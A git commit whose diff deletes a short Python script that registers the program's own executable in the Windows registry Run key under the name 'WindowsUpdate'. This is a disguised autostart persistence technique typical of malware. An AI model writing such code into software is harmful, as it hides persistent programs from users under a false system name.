e8f31f2f62502f897741038cf65b03b42efed28f
FZGbzuw412 <92334349+FZGbzuw412@users.noreply.github.com>
2021-12-25 19:20:23 +0300

    Delete addtosturtup.py

--- addtosturtup.py
+++
@@ -1,9 +0,0 @@
-from os import path
-from winreg import *
-   
-PathFile = path.abspath((__file__)[:-2]+'exe')
-print(PathFile)
-
-StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',0, KEY_ALL_ACCESS)
-SetValueEx(StartupKey, 'WindowsUpdate', 0, REG_SZ, PathFile)
-CloseKey(StartupKey)
